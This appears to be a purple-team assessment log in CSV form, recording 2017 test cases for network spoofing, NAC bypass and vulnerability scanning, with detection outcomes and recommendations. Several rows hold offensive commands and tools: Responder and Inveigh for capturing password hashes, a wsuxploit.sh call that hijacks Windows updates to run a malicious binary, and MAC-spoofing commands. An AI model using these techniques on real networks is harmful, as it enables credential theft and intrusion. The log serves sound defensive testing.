AssessmentGroup,Campaign,Phase,Variant,MitreID,CapecId,Method,Status,Outcome,Alert Severity,Alert Triggered,Activity Logged,Outcome Notes,Detection Recommendations,SourceIps,TargetAssets,ExpectedDetectionLayers,DetectingTools,Start Time,Start Time Epoch,Stop Time,Stop Time Epoch,Detection Time,Detection Time Epoch,Organizations,Tags,Objective,Command,References,Liklihood,Risk,Internal/External,Stealth,Attack Vector,Attack Complexity,Privileges Required,Attacker Tools
Enterprise Purple – 2017 Q1,Network MiTM,Exploitation,Basic Auth & WPAD,T1040,,Network spoofing,Completed,Blocked,TBD,No,TBD,,1) Rogue device triggers alert from NAC solution or potential UEBA tool when broadcasting lots of traffic.,,,"Network Isolation,Secure Baselines,Behavior Analytics",Secure Configs,2017-01-17T09:20:25.930Z,1484644825930,2017-01-17T10:13:47.930Z,1484648027930,2017-01-17T12:05:23.930Z,1484654723930,Security Risk Advisors,,"Respond to local network queries for systems over LLMNR and NetBIOS, obtain domain user password hashes and clear text credentials",,,High,High,Internal,Medium,,,,Responder
Enterprise Purple – 2017 Q1,Network MiTM,Exploitation,Inveigh,T1557.001,,Network Spoofing,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert from NAC solution or potential UEBA tool when broadcasting lots of traffic.,,,"Network Isolation,Secure Baselines,Behavior Analytics",,2017-01-17T06:55:13.930Z,1484636113930,2017-01-17T07:29:48.930Z,1484638188930,2017-01-17T08:18:04.930Z,1484641084930,Security Risk Advisors,,Run the powershell inveigh toolset via a beacon.,Invoke-Inveigh  NBNS - Y,,Low,Low,Internal,Low,,,,
Enterprise Purple – 2017 Q1,Network MiTM,Exploitation,Unencrypted Windows Update,T1040,,Network spoofing,Completed,Blocked,TBD,No,TBD,,,,,Secure Baselines,Secure Configs,2017-01-17T01:08:33.930Z,1484615313930,2017-01-17T02:19:57.930Z,1484619597930,2017-01-17T02:55:23.930Z,1484621723930,Security Risk Advisors,,Intercept Windows Updates on the target laptop in order to run a malicious binary,./wsuxploit.sh <TARGET_IP> <WSUS_IP> <WSUS_PORT> <BINARY_PATH>,,High,High,Internal,Medium,,,,
Enterprise Purple – 2017 Q1,Network MiTM,Exploitation,LLMNR,T1557.001,,Network spoofing,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert from NAC solution or potential UEBA tool when broadcasting lots of traffic.,,,"Network Isolation,Secure Baselines,Behavior Analytics",,2017-01-17T03:47:19.930Z,1484624839930,2017-01-17T04:14:05.930Z,1484626445930,2017-01-17T05:13:07.930Z,1484629987930,Security Risk Advisors,,"Respond to local network queries for systems over LLMNR and NetBIOS, obtain domain user password hashes and clear text credentials.",,,High,High,Internal,Medium,,,,Responder
Enterprise Purple – 2017 Q1,NAC Bypass,Exploitation,Static IP Address,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2017-01-16T21:26:44.930Z,1484602004930,2017-01-16T23:06:55.930Z,1484608015930,2017-01-16T23:59:37.930Z,1484611177930,Security Risk Advisors,,Set a static IP address on the attack host to bypass any network restrictions.,Change ip address of network adapter to a static address,,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2017 Q1,NAC Bypass,Exploitation,Apple MAC Address,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2017-01-16T18:52:49.930Z,1484592769930,2017-01-16T19:22:01.930Z,1484594521930,2017-01-16T19:29:22.930Z,1484594962930,Security Risk Advisors,,Change the MAC address to a Apple manufacturer code.,"Disable wifi and run the following:
sudo ifconfig en0 ether <New_Mac_Address>",,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2017 Q1,NAC Bypass,Exploitation,PC MAC Address,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2017-01-16T15:59:04.930Z,1484582344930,2017-01-16T16:41:56.930Z,1484584916930,2017-01-16T18:02:35.930Z,1484589755930,Security Risk Advisors,,Change the MAC address to a PC manufacturer code.,,,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2017 Q1,NAC Bypass,Discovery,Passive Network Recon,T1049,,Passive network recon,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,"Network Isolation,Behavior Analytics",,2017-01-16T02:07:18.930Z,1484532438930,2017-01-16T02:35:29.930Z,1484534129930,2017-01-16T02:55:37.930Z,1484535337930,Security Risk Advisors,,"Obtain information from the network including MAC addresses, valid IP addresses, and hostnames.",,,High,High,Internal,High,,,,"Manual Techniques,Native Windows Commands"
Enterprise Purple – 2017 Q1,NAC Bypass,Exploitation,Raspberry Pi,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2017-01-16T03:19:57.930Z,1484536797930,2017-01-16T04:31:27.930Z,1484541087930,2017-01-16T06:15:29.930Z,1484547329930,Security Risk Advisors,,Connect an untrusted device to the network to exploit NAC controls.,Connect raspberry pi into a wall jack.,,Low,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2017 Q1,NAC Bypass,Exploitation,Network Device MAC Address,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2017-01-16T06:44:24.930Z,1484549064930,2017-01-16T07:13:23.930Z,1484550803930,2017-01-16T07:29:33.930Z,1484551773930,Security Risk Advisors,,Change the MAC address to a network device manufacturer code.,Use device manager and change the mac address value for network adapter,,High,High,Internal,Medium,,,,"Manual Techniques,Native Windows Commands"
Enterprise Purple – 2017 Q1,NAC Bypass,Exploitation,Printer MAC Address,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2017-01-16T09:12:51.930Z,1484557971930,2017-01-16T09:31:44.930Z,1484559104930,2017-01-16T10:15:09.930Z,1484561709930,Security Risk Advisors,,Change the MAC address to a printer manufacturer code.,"#Linux
macchanger -m <MAC> <Interface>
#Windows
Device Manager -> Network Adapters -> Advanced
Look for Locally Administrative Address or Network Address and change the value for that (No : needed)",,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2017 Q1,NAC Bypass,Exploitation,Unusual MAC Address,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2017-01-16T12:03:20.930Z,1484568200930,2017-01-16T13:58:23.930Z,1484575103930,2017-01-16T15:40:23.930Z,1484581223930,Security Risk Advisors,,Change the MAC address to an unusual manufacturer code.,"In device manager, change the network adapter's mac address value",,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2017 Q1,External Automated Scans,Reconnaissance,Network Vulnerability Scan - External IP Ranges,T1046,,Vulnerability scanning,Completed,Detected,Med,TBD,TBD,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall to alert on high volume scan activity.",,,"Firewall,WAF",Gunhed,2017-01-04T21:00:39.930Z,1483563639930,2017-01-04T21:16:23.930Z,1483564583930,2017-01-04T21:36:32.930Z,1483565792930,Security Risk Advisors,,"Launch a application vulnerability scan against targeted application, creating an excessive amount of traffic originating from a single source.",,,High,Medium,Both,Low,,,,Nessus
Enterprise Purple – 2017 Q1,External Automated Scans,Reconnaissance,Application Vulnerability Scan - TARGET 1,T1046,,Vulnerability scanning,Completed,NotDetected,TBD,TBD,Yes,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall to alert on high volume scan activity.",,,"Firewall,WAF",,2017-01-04T15:24:12.930Z,1483543452930,2017-01-04T16:25:15.930Z,1483547115930,2017-01-04T17:31:12.930Z,1483551072930,Security Risk Advisors,,"Launch a application vulnerability scan against targeted application, creating an excessive amount of traffic originating from a single source.",Run active scans using Burp or other web application scanning tools,,High,Medium,Both,Low,,,,BurpSuite
Enterprise Purple – 2017 Q1,External Automated Scans,Reconnaissance,Application Vulnerability Scan - TARGET 2,T1046,,Vulnerability scanning,Completed,NotDetected,TBD,TBD,Yes,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall to alert on high volume scan activity.",,,Firewall,,2017-01-04T18:01:49.930Z,1483552909930,2017-01-04T19:02:55.930Z,1483556575930,2017-01-04T20:22:04.930Z,1483561324930,Security Risk Advisors,,"Launch a application vulnerability scan against targeted application, creating an excessive amount of traffic originating from a single source.",Run active scans using Burp or other web application scanning tools,,High,Medium,Both,Low,,,,BurpSuite
